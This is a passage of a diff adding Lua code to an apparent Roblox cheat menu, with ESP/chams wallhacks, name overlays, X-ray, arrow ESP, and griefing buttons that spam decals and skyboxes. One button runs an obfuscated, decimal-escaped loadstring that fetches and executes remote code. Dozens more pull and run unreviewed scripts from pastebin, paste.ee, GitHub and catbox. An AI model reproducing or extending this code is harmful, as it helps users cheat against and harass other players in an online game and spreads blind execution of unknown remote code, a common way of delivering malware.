+            function ChamsHEH(target)
+            local faces = {"Back","Bottom","Front","Left","Right","Top"}
+      for _, v in pairs(game.Players:GetChildren()) do if v.Name ~= game.Players.LocalPlayer.Name then
+    for _, p in pairs(v.Character:GetChildren()) do
+      if p:IsA("BasePart") then
+        for _, f in pairs(faces) do
+          local a = Instance.new("BoxHandleAdornment")
+          a.Name = "EGUI"
+          a.Parent = p
+          a.Adornee = p
+          a.AlwaysOnTop = true
+          a.ZIndex = 10
+          a.Size = p.Size
+          a.Transparency = 0.3
+          a.Color3 = Color3.new(255, 255, 255)
+                    chamshah[target] = a
+        end
+      end
+    end
+end
+end
+end
+
+chamsadded = game.Players.PlayerAdded:Connect(function(v)
+    v.CharacterAdded:Connect(function()
+        ChamsHEH(v)
+    end)
+end)
+
+chamsremoved = game.Players.PlayerRemoving:Connect(function(v)
+    if chamshah[v] then
+        chamshah[v]:Destroy()
+        chamshah[v] = nil
+    end
+end)
+
+local faces = {"Back","Bottom","Front","Left","Right","Top"}
+      for _, v in pairs(game.Players:GetChildren()) do if v.Name ~= game.Players.LocalPlayer.Name then
+    for _, p in pairs(v.Character:GetChildren()) do
+      if p:IsA("BasePart") then
+        for _, f in pairs(faces) do
+          local a = Instance.new("BoxHandleAdornment")
+          a.Name = "EGUI"
+          a.Parent = p
+          a.Adornee = p
+          a.AlwaysOnTop = true
+          a.ZIndex = 10
+          a.Size = p.Size
+          a.Transparency = 0.3
+          a.Color3 = Color3.new(255, 255, 255)
+        end
+      end
+    end
+end
+end
+        else
+      Chams = false
+      for _, v in pairs(game.Workspace:GetDescendants()) do
+      if v.Name == ("EGUI") then
+        v:Remove()
+        end
+        end
+            if chamsadded ~= nil then
+        chamsadded:Disconnect()
+    end
+            if chamsremoved ~= nil then
+        chamsremoved:Disconnect()
+    end
+chamshah = {}
+  end
+  end    
+})
+
+Tab:AddToggle({
+  Name = "Show Names",
+  Default = false,
+  Callback = function(NameChams)
+    if NameChams == true then
+      for _, v in pairs(game.Players:GetChildren()) do if v.Name ~= game.Players.LocalPlayer.Name then
+      local bgui = Instance.new("BillboardGui", v.Character.Head)
+  bgui.Name = ("NAMGUI")
+  bgui.AlwaysOnTop = true
+  bgui.ExtentsOffset = Vector3.new(0,3,0)
+  bgui.Size = UDim2.new(0,200,0,50)
+  local nam = Instance.new("TextLabel",bgui)
+  nam.Text = v.Name
+  nam.BackgroundTransparency = 1
+  nam.TextSize = 30
+  nam.Font = ("Arial")
+  nam.TextColor3 = Color3.new(1, 1, 1)
+  nam.Size = UDim2.new(0,200,0,50)
+  end
+  end
+        else
+      NameChams = false
+      for _, v in pairs(game.Workspace:GetDescendants()) do
+      if v.Name == ("NAMGUI") then
+        v:Remove()
+        end
+        end
+  end
+  end    
+})
+
+Tab:AddToggle({
+  Name = "Show TeamColor",
+  Default = false,
+  Callback = function(TeamColorChams)
+    if TeamColorChams == true then
+      for i,v in pairs(game.Players:GetChildren()) do
+        if v.Name ~= game.Players.LocalPlayer.Name then
+          for i,b in pairs(v.Character:GetChildren()) do
+            if b:IsA("BasePart") then
+              for i,c in pairs(b:GetDescendants()) do
+                if c.Name == "EGUI" and c:IsA("BoxHandleAdornment") then
+                  c.Color = v.TeamColor
+                end	
+              end	
+            end
+          end
+        end	
+      end
+        else
+      TeamColorChams = false
+      for i,v in pairs(game.Players:GetChildren()) do
+        if v.Name ~= game.Players.LocalPlayer.Name then
+          for i,b in pairs(v.Character:GetChildren()) do
+            if b:IsA("BasePart") then
+              for i,c in pairs(b:GetDescendants()) do
+                if c.Name == "EGUI" and c:IsA("BoxHandleAdornment") then
+                  c.Color3 = Color3.new(255, 255, 255)
+                end	
+              end	
+            end
+          end
+        end	
+      end
+  end
+  end    
+})
+
+Tab:AddToggle({
+  Name = "Show Rainbow Color",
+  Default = false,
+  Callback = function(RainbowColorc)
+    if RainbowColorc == true then
+      for i,v in pairs(game.Players:GetChildren()) do
+        if v.Name ~= game.Players.LocalPlayer.Name then
+          for i,b in pairs(v.Character:GetChildren()) do
+            if b:IsA("BasePart") then
+              for i,c in pairs(b:GetDescendants()) do
+                if c.Name == "EGUI" and c:IsA("BoxHandleAdornment") then
+                  local t = 5; --how long does it take to go through the rainbow
+
+local tick = tick
+local fromHSV = Color3.fromHSV
+local RunService = game:GetService("RunService")
+local Frame = script.Parent
+
+RunService:BindToRenderStep("Rainbow", 1000, function()
+  local hue = tick() % t / t
+  local color = fromHSV(hue, 1, 1)
+  c.Color3 = color
+end)
+                end	
+              end	
+            end
+          end
+        end	
+      end
+        else
+      RainbowColorc = false
+      for i,v in pairs(game.Players:GetChildren()) do
+        if v.Name ~= game.Players.LocalPlayer.Name then
+          for i,b in pairs(v.Character:GetChildren()) do
+            if b:IsA("BasePart") then
+              for i,c in pairs(b:GetDescendants()) do
+                if c.Name == "EGUI" and c:IsA("BoxHandleAdornment") then
+                  c:Destroy()
+                end
+              end
+            end
+          end
+        end	
+      end										
+  end
+  end    
+})
+Tab:AddToggle({
+  Name = "X-Ray",
+  Default = false,
+  Callback = function(Xray)
+    if Xray == true then
+              for _,i in pairs(workspace:GetDescendants()) do
+      if i:IsA("BasePart") and not i.Parent:FindFirstChild("Humanoid") and not i.Parent.Parent:FindFirstChild("Humanoid") then
+        i.LocalTransparencyModifier = 0.75
+      end
+    end
+          else
+         Xray = false
+               for _,i in pairs(workspace:GetDescendants()) do
+      if i:IsA("BasePart") and not i.Parent:FindFirstChild("Humanoid") and not i.Parent.Parent:FindFirstChild("Humanoid") then
+        i.LocalTransparencyModifier = 0
+      end
+    end
+  end
+  end    
+})
+
+Tab:AddButton({
+  Name = "Arrow ESP",
+  Callback = function()
+      -- Made by Blissful#4992
+local DistFromCenter = 80
+local TriangleHeight = 16
+local TriangleWidth = 16
+local TriangleFilled = false
+local TriangleTransparency = 0
+local TriangleThickness = 2
+local TriangleColor = Color3.fromRGB(0, 255, 255)
+local AntiAliasing = false
+----------------------------------------------------------------
+local Players = game:service("Players")
+local Player = Players.LocalPlayer
+local Camera = workspace.CurrentCamera
+local RS = game:service("RunService")
+local V3 = Vector3.new
+local V2 = Vector2.new
+local CF = CFrame.new
+local COS = math.cos
+local SIN = math.sin
+local RAD = math.rad
+local DRAWING = Drawing.new
+local CWRAP = coroutine.wrap
+local ROUND = math.round
+local function GetRelative(pos, char)
+if not char then return V2(0,0) end
+local rootP = char.PrimaryPart.Position
+local camP = Camera.CFrame.Position
+camP = V3(camP.X, rootP.Y, camP.Z)
+local newcf = CF(rootP, camP)
+local r = newcf:PointToObjectSpace(pos)
+return V2(r.X, r.Z)
+end
+local function RelativeToCenter(v)
+return Camera.ViewportSize/2 - v
+end
+local function RotateVect(v, a)
+a = RAD(a)
+local x = v.x * COS(a) - v.y * SIN(a)
+local y = v.x * SIN(a) + v.y * COS(a)
+return V2(x, y)
+end
+local function DrawTriangle(color)
+local l = DRAWING("Triangle")
+l.Visible = false
+l.Color = color
+l.Filled = TriangleFilled
+l.Thickness = TriangleThickness
+l.Transparency = 1-TriangleTransparency
+return l
+end
+local function AntiA(v)
+if (not AntiAliasing) then return v end
+return V2(ROUND(v.x), ROUND(v.y))
+end
+local function ShowArrow(PLAYER)
+local Arrow = DrawTriangle(TriangleColor)
+local function Update()
+local c 
+c = RS.RenderStepped:Connect(function()
+if PLAYER and PLAYER.Character then
+local CHAR = PLAYER.Character
+local HUM = CHAR:FindFirstChildOfClass("Humanoid")
+if HUM and CHAR.PrimaryPart ~= nil and HUM.Health > 0 then
+local _,vis = Camera:WorldToViewportPoint(CHAR.PrimaryPart.Position)
+if vis == false then
+local rel = GetRelative(CHAR.PrimaryPart.Position, Player.Character)
+local direction = rel.unit
+local base  = direction * DistFromCenter
+local sideLength = TriangleWidth/2
+local baseL = base + RotateVect(direction, 90) * sideLength
+local baseR = base + RotateVect(direction, -90) * sideLength
+local tip = direction * (DistFromCenter + TriangleHeight)
+Arrow.PointA = AntiA(RelativeToCenter(baseL))
+Arrow.PointB = AntiA(RelativeToCenter(baseR))
+Arrow.PointC = AntiA(RelativeToCenter(tip))
+Arrow.Visible = true
+else Arrow.Visible = false end
+else Arrow.Visible = false end
+else
+Arrow.Visible = false
+if not PLAYER or not PLAYER.Parent then
+Arrow:Remove()
+c:Disconnect()
+end
+end
+end)
+end
+CWRAP(Update)()
+end
+for _,v in pairs(Players:GetChildren()) do
+if v.Name ~= Player.Name then
+ShowArrow(v)
+end
+end
+Players.PlayerAdded:Connect(function(v)
+if v.Name ~= Player.Name then
+ShowArrow(v)
+end
+end)
+    end    
+})
+local Tab = Window:MakeTab({
+	Name = "FE Scripts",
+	Icon = "rbxassetid://6031360355",
+	PremiumOnly = false
+ })
+ local Section = Tab:AddSection({
+	Name = "Scripts"
+})
+Tab:AddButton({
+	Name = "FE Bypass Gui (VERY OP)",
+	Callback = function()
+      	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\48\48\108\88\112\108\111\105\116\101\114\47\103\48\48\108\88\112\108\111\105\116\101\114\47\109\97\105\110\47\70\101\37\50\48\98\121\112\97\115\115\34\44\32\116\114\117\101\41\41\40\41\10")()
+  	end   
+})
+      Tab:AddButton({
+	Name = "FE Gui ",
+	Callback = function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Blukezz/UTG-V4/main/Lib.lua"))()
+
+            local Main_ = libary:CreateMain()
+
+            Main_:CreateButton("Neptunion V", "Corrupt Demonic Greatsword", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/AdLeNbD7"))()
+            end)
+
+            Main_:CreateButton("Rb Neptunion", "Russos Sword of Truth", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/ztTyE58C"))()
+            end)
+
+            Main_:CreateButton("Krystal Dance", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/FV3HLmTH"))()
+            end)
+
+            Main_:CreateButton("Walk On Walls", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/RY9cBbdG"))()
+            end)
+
+            Main_:CreateButton("Sonic", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/SyF5t70A"))()
+            end)
+
+            Main_:CreateButton("Among Us V4", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://paste.ee/r/6c5AO/0"))()
+            end)
+
+            Main_:CreateButton("Killbot V2", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/ydQ1ysuA"))()
+            end)
+
+            Main_:CreateButton("Neko Maid", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://paste.ee/d/iCtCM/0"))()
+            end)
+
+            Main_:CreateButton("R15 Invis", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/uc6nN23y"))()
+            end)
+
+            Main_:CreateButton("Achromatic", "Shadow Blademasters Blade, Blademasters Blade", "Golden Demonic Greatsword, Corrupt Demonic Greatsword", "Frozen Demonic Greatsword, Demonic Greatsword", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/ziSNxnKP"))()
+            end)
+
+            Main_:CreateButton("Boobs", "Motocross #62: Fire", "Motocross #77: The Sting", "Pink Ornament Earrings", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/CszjntnR"))()
+            end)
+
+            Main_:CreateButton("Floss", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/JfyvWHLf"))()
+            end)
+
+            Main_:CreateButton("Defult Dance", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/iXAe7Fub"))()
+            end)
+
+            Main_:CreateButton("Pillow", "Pillow", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/RbKLMpdt"))()
+            end)
+
+            Main_:CreateButton("Drone", "Ro Drone", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/GriadDUx"))()
+            end)
+
+            Main_:CreateButton("Trash Can", "Trash Can", "Trash Cam Lid", "Destructive Aura", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/zeYrMRa2"))()
+            end)
+
+            Main_:CreateButton("Chill", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/XmHFdTij"))()
+            end)
+
+            Main_:CreateButton("Ultimate Meme Dance", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/0QfjMKrF"))()
+            end)
+
+            Main_:CreateButton("Joy", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/LEAQuKj0"))()
+            end)
+
+            Main_:CreateButton("Spider", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/QjjD7gx1"))()
+            end)
+
+            Main_:CreateButton("SkateBoard Remastered", "Skateboard #12: Checker Chase", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/xqAN0bhi"))()
+            end)
+
+            Main_:CreateButton("VR", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/vGrV94iZ"))()
+            end)
+
+            Main_:CreateButton("Stand", "Robox, Brown Hair", "Chestnut Bun, Pal Hair", "Red Roblox Cap", "Lavender-Updo", "ROBLOX-Girl-Hair", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/RZUwatYV"))()
+            end)
+
+            Main_:CreateButton("Xester", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/RPwyPvEi"))()
+            end)
+
+            Main_:CreateButton("Elio Blasio", "METAL x LIGHTSEER 77", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/xvBXu6Yc"))()
+            end)
+
+            Main_:CreateButton("Elio Blasio V2", "METAL x LIGHTSEER 77", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/MNenPDAw"))()
+            end)
+
+            Main_:CreateButton("Sniper", "Cyberpunk Sniper7", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/xwhiWedh"))()
+            end)
+
+            Main_:CreateButton("Black Hole (Contros unanchored parts E to move black hole)", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/ijZtSa5c"))()
+            end)
+
+            Main_:CreateButton("Smug Dance", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/Zawb88SA"))()
+            end)
+
+            Main_:CreateButton("Chips", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/w36Bzq3k"))()
+            end)
+
+            Main_:CreateButton("Gale Fighter", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/5jBTETjn"))()
+            end)
+
+            Main_:CreateButton("Broom Stick", "Witch Wizard Broom Classic", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/5007RmTh"))()
+            end)
+
+            Main_:CreateButton("Gooppie Dance", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/0kRSgCDT"))()
+            end)
+
+            Main_:CreateButton("Minigun", "Type-40 Juggernauts Chain Gun", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/pza8ZXXS"))()
+            end)
+
+            Main_:CreateButton("Minigun V2", "Type-9000 Minigun", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/2VNFAQZp"))()
+            end)
+
+            Main_:CreateButton("Head Hold", "Type-40 Juggernauts Chain Gun", "", "", "", "", function()
+              _G.CharacterBug = false
+              loadstring(game:HttpGet("https://paste.ee/r/MM6ns"))()
+            end)
+
+            Main_:CreateButton("Headless", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/QUDSU8Fk"))()
+            end)
+
+            Main_:CreateButton("FireCube", "Fiery-Fox-Shoulder-Pal", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/D7pigANg"))()
+            end)
+
+            Main_:CreateButton("/Kill Command", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/iV0nshSk"))()
+            end)
+
+            Main_:CreateButton("Memeus", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/2MSTmKBa"))()
+            end)
+
+            Main_:CreateButton("Pen", "Corrupt Demonic Greatsword", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/ALEpWneG"))()
+            end)
+
+            Main_:CreateButton("Baller V2", "Red Stickman Head, International Fedora - USA", "International Fedora - Colombia", "International Fedora - Argentina", "International Fedora - Vietnam", "International Fedora - Brazil", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/ALEpWneG"))()
+            end)
+
+            Main_:CreateButton("Baller", "Red Stickman Head", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Lowerrated/roblox-fe-baller-script/main/main"))()
+            end)
+
+            Main_:CreateButton("Piano Autoplayer", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Sw1ndlerScripts/RobloxScripts/main/MiscScripts/PianoAutoplayer.lua"))()
+            end)
+
+            Main_:CreateButton("Unanchored Gui", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/WkZwcGjf"))()
+            end)
+
+            Main_:CreateButton("Fake Lag", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/tUE47M3a"))()
+            end)
+
+            Main_:CreateButton("Hammer", "Oversized Hammer of the Titans", "Red Roblox Cap", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/MfLmztAC"))()
+            end)
+
+            Main_:CreateButton("Double Barrel Shotgun", "DB12 [Left Hip]", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/ZZLtusFM"))()
+            end)
+
+            Main_:CreateButton("Block Gun", "Pal Hair", "Red Roblox Cap", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/crVVpKFa"))()
+            end)
+
+            Main_:CreateButton("Hoverboard", "Flaming Mohawk", "Brown Hair", "Pal Hair", "Lavender Updo", "Chesnut Bun", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/xSNp0dKd"))()
+            end)
+
+            Main_:CreateButton("Abyss Eye", "Demonic Greatsword", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/shrVqzAX"))()
+            end)
+
+            Main_:CreateButton("Smile", "ROBLOX Girl - Hair", "Chestnut Bun", "Brown Hair", "Pal Hair", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/5QQe8FHt"))()
+            end)
+
+            Main_:CreateButton("Pog Dance", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/vYhAqnKn"))()
+            end)
+
+            Main_:CreateButton("Darth Vader", "Saber Simulator: Red Light Saber", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/61ctwEy1"))()
+            end)
+
+            Main_:CreateButton("Guts", "Slasher", "Fan Hand Sign - Why Don't We (WDW)", "International Fedora - Germany", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/BErqYgmC"))()
+            end)
+
+            Main_:CreateButton("Grand Master", "None", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/jetfya03"))()
+            end)
+
+            Main_:CreateButton("Food Grill", "Grill", "Burger Bob", "Grilled Sausage", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/Tj1tjdZW"))()
+            end)
+
+            Main_:CreateButton("Toggle Fling (X)", "None", "", "", "", "", function()
+              _G.KeyCode = "X"
+              loadstring(game:HttpGet("https://shattered-gang.lol/scripts/fe/touch_fling.lua"))()
+            end)
+
+            Main_:CreateButton("Rocket Launcher", "Le Rouge Cross-body Bag 1.0", "Nike Shoebox Costume", "Head Slime", "Spider Cola", "The Bird Says____.", function()
+              loadstring(game:HttpGet(("https://gist.githubusercontent.com/redmoons1/4ae7d132cdfe8dba6ab2081e38ca1f8b/raw/ca9b6c1b2bad7589bad72aeaec720ad18890b702/rocket launcher"),true))()
+            end)
+
+            Main_:CreateButton("Prison Life", "None", "", "", "", "", function()
+              loadstring(game:HttpGet("https://pastebin.com/raw/LnAUPBXj",true))()
+            end)
+
+            Main_:CreateButton("Slasher", "Slasher", "", "", "", "", function()
+              loadstring(game:HttpGetAsync("https://pastebin.com/raw/qQk2MB7R"))()
+            end)
+  	end   
+})
+Tab:AddButton({
+	Name = "Grab Knife V1",
+	Callback = function()
+  loadstring(game:HttpGet("https://pastebin.com/raw/SSAzNj10", true))()    	
+  	end   
+})
+
+Tab:AddButton({
+	Name = "Grab Knife V2",
+	Callback = function()
+     loadstring(game:HttpGet("https://pastebin.com/raw/Bw7aWTBL", true))() 	
+  	end   
+})
+Tab:AddButton({
+	Name = "Grab Knife V3",
+	Callback = function()
+      	loadstring(game:HttpGet("https://pastebin.com/raw/frHvA27v", true))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Grab Knife V4",
+	Callback = function()
+     loadstring(game:HttpGet("https://pastebin.com/raw/ANs9UDrn", true))() 	
+  	end   
+})
+Tab:AddButton({
+	Name = "666",
+	Callback = function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/d56eg7r9"))()  	
+  	end   
+})
+
+Tab:AddButton({
+	Name = "Lua Hammer",
+	Callback = function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/RKY5fTXh", true))()  	
+  	end   
+})
+	Tab:AddButton({
+	Name = "Ball Bomb",
+	Callback = function()
+   loadstring(game:HttpGet("https://pastebin.com/raw/5MMWBpcF"))()   	
+  	end   
+})
+  Tab:AddButton({
+	Name = "WTF bomb",
+	Callback = function()
+      	loadstring(game:HttpGet("https://pastebin.com/raw/TbfGQE3Y"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Brock",
+	Callback = function()
+     loadstring(game:HttpGet("https://pastebin.com/raw/LvRVzzTL", true))() 	
+  	end   
+})
+Tab:AddButton({
+	Name = "Brid Wings",
+	Callback = function()
+   loadstring(game:HttpGet("https://pastebin.com/raw/zCypYHjJ", true))()   	
+  	end   
+})
+Tab:AddButton({
+	Name = "Doge",
+	Callback = function()
+   loadstring(game:HttpGet("https://pastebin.com/raw/31xeU3pX", true))()   	
+  	end   
+})
+Tab:AddButton({
+	Name = "Dev Uzi",
+	Callback = function()
+   loadstring(game:HttpGet("https://pastebin.com/raw/X2n20xqM", true))()   	
+  	end   
+})
+Tab:AddButton({
+	Name = "Trump Titan",
+	Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaGunsX/LuasLegacyScripts/main/%5BTitans%5D%20Trump", true))()  	
+  	end   
+})
+Tab:AddButton({
+	Name = "UVG",
+	Callback = function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaGunsX/LuasLegacyScripts/main/%5BGUI%5D%20Ultimate%20Van%20GUI", true))()   	
+  	end   
+})
+Tab:AddButton({
+	Name = "iOrb 2.0",
+	Callback = function()
+   loadstring(game:HttpGet("https://files.catbox.moe/uhtmgb.lua", true))()   	
+  	end   
+})
+Tab:AddButton({
+	Name = "Doritus Particles",
+	Callback = function()
+      	loadstring(game:HttpGet("https://pastebin.com/raw/KWmEQMkq"))()
+  	end   
+})
+      Tab:AddButton({
+	Name = "Mlg Particles",
+	Callback = function()
+      	loadstring(game:HttpGet("https://pastebin.com/raw/nriGxMtT"))()
+  	end   
+})
+      Tab:AddButton({
+	Name = "Illuminati Particles",
+	Callback = function()
+      	loadstring(game:HttpGet("https://pastebin.com/raw/UPAA82Fk"))()
+  	end   
+})
+      Tab:AddButton({
+	Name = "Anonymous Particles",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/ryand56/Scripts/Scripts/anonymous%20all.txt"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Donald Trump Particles",
+	Callback = function()
+      	loadstring(game:HttpGet("https://pastebin.com/raw/PJx5RP5F"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "RC7 Particles",
+	Callback = function()
+      loadstring(game:HttpGet("https://pastebin.com/raw/cwvCvJ2g"))()	
+  	end   
+})
+
+      
+local Section = Tab:AddSection({
+	Name = "Place"
+})
+Tab:AddButton({
+	Name = "skeleton skybox",
+	Callback = function()
+      	imageOne = "http://www.roblox.com/asset/?id=169585459"
+
+imageTwo = "http://www.roblox.com/asset/?id=169585475"
+
+imageThree = "http://www.roblox.com/asset/?id=169585485"
+
+imageFour = "http://www.roblox.com/asset/?id=169585502"
+
+imageFive = "http://www.roblox.com/asset/?id=169585515"
+
+imageSix = "http://www.roblox.com/asset/?id=169585502"
+
+imageSeven = "http://www.roblox.com/asset/?id=169585485"
+
+imageEight = "http://www.roblox.com/asset/?id=169585475"
+
+
+
+Spooky = Instance.new("Sound", workspace)
+
+Spooky.Name = "Spooky"
+
+Spooky.SoundId = "rbxassetid://174270407"
+
+Spooky.Volume = 15
+
+Spooky.Looped = true
+
+Spooky:Play()
+
+
+
+Sky = Instance.new("Sky", game.Lighting)
+
+Sky.SkyboxBk = imageOne
+
+Sky.SkyboxDn = imageOne
+
+Sky.SkyboxFt = imageOne
+
+Sky.SkyboxLf = imageOne
+
+Sky.SkyboxRt = imageOne
+
+Sky.SkyboxUp = imageOne
+
+
+
+
+
+while true do
+
+    Sky.SkyboxBk = imageOne
+
+    Sky.SkyboxDn = imageOne
+
+    Sky.SkyboxFt = imageOne
+
+    Sky.SkyboxLf = imageOne
+
+    Sky.SkyboxRt = imageOne
+
+    Sky.SkyboxUp = imageOne
+
+    wait(0.15)
+
+    Sky.SkyboxBk = imageTwo
+
+    Sky.SkyboxDn = imageTwo
+
+    Sky.SkyboxFt = imageTwo
+
+    Sky.SkyboxLf = imageTwo
+
+    Sky.SkyboxRt = imageTwo
+
+    Sky.SkyboxUp = imageTwo
+
+    wait(0.15)
+
+    Sky.SkyboxBk = imageThree
+
+    Sky.SkyboxDn = imageThree
+
+    Sky.SkyboxFt = imageThree
+
+    Sky.SkyboxLf = imageThree
+
+    Sky.SkyboxRt = imageThree
+
+    Sky.SkyboxUp = imageThree
+
+    wait(0.15)
+
+    Sky.SkyboxBk = imageFour
+
+    Sky.SkyboxDn = imageFour
+
+    Sky.SkyboxFt = imageFour
+
+    Sky.SkyboxLf = imageFour
+
+    Sky.SkyboxRt = imageFour
+
+    Sky.SkyboxUp = imageFour
+
+    wait(0.15)
+
+    Sky.SkyboxBk = imageFive
+
+    Sky.SkyboxDn = imageFive
+
+    Sky.SkyboxFt = imageFive
+
+    Sky.SkyboxLf = imageFive
+
+    Sky.SkyboxRt = imageFive
+
+    Sky.SkyboxUp = imageFive
+
+    wait(0.15)
+
+    Sky.SkyboxBk = imageSix
+
+    Sky.SkyboxDn = imageSix
+
+    Sky.SkyboxFt = imageSix
+
+    Sky.SkyboxLf = imageSix
+
+    Sky.SkyboxRt = imageSix
+
+    Sky.SkyboxUp = imageSix
+
+    wait(0.15)
+
+    Sky.SkyboxBk = imageSeven
+
+    Sky.SkyboxDn = imageSeven
+
+    Sky.SkyboxFt = imageSeven
+
+    Sky.SkyboxLf = imageSeven
+
+    Sky.SkyboxRt = imageSeven
+
+    Sky.SkyboxUp = imageSeven
+
+    wait(0.15)
+
+    Sky.SkyboxBk = imageEight
+
+    Sky.SkyboxDn = imageEight
+
+    Sky.SkyboxFt = imageEight
+
+    Sky.SkyboxLf = imageEight
+
+    Sky.SkyboxRt = imageEight
+
+    Sky.SkyboxUp = imageEight
+
+    wait(0.15)
+
+    
+
+            end
+  	end   
+})
+Tab:AddButton({
+	Name = "Decal",
+	Callback = function()
+      local ID =13784335227 --id here
+function spamDecal(v)
+    if v:IsA("Part") then
+        for i=0, 5 do
+            D = Instance.new("Decal")
+            D.Name = "MYDECALHUE"
+            D.Face = i
+            D.Parent = v
+            D.Texture = ("http://www.roblox.com/asset/?id="..Id)
+        end
+    else
+        if v:IsA("Model") then
+            for a,b in pairs(v:GetChildren()) do
+                spamDecal(b)
+            end
+        end
+    end
+end
+function decalspam(id) --use this function, not the one on top
+    Id = id
+    for i,v in pairs(game.Workspace:GetChildren()) do
+        if v:IsA("Part") then
+        for i=0, 5 do
+            D = Instance.new("Decal")
+            D.Name = "MYDECALHUE"
+            D.Face = i
+            D.Parent = v
+            D.Texture = ("http://www.roblox.com/asset/?id="..id)
+        end
+    else
+        if v:IsA("Model") then
+            for a,b in pairs(v:GetChildren()) do
+                spamDecal(b)
+            end
+        end
+    end
+end
+end
+ 
+decalspam(ID)	
+  	end   
+})
+
+Tab:AddButton({
+	Name = "Night",
+	Callback = function()
+      while true do 
+		print ("Loop cycle start")
+		game.Lighting.TimeOfDay = "23:00:00"
+		wait(0.5)
+            end	
+  	end   
+})
+Tab:AddButton({
+	Name = "Disco",
+	Callback = function()
+      	while true do
+ wait(0.5)
+ game.Lighting.Ambient = Color3.new(math.random(), math.random(), math.random())
+ game.Lighting.ColorShift_Top = Color3.new(math.random(), math.random(), math.random())
+ game.Lighting.ColorShift_Bottom = Color3.new(math.random(), math.random(), math.random())
+ game.Lighting.ShadowColor = Color3.new(math.random(), math.random(), math.random())
+            end
+  	end   
+})
+Tab:AddButton({
+	Name = "666",
+	Callback = function()
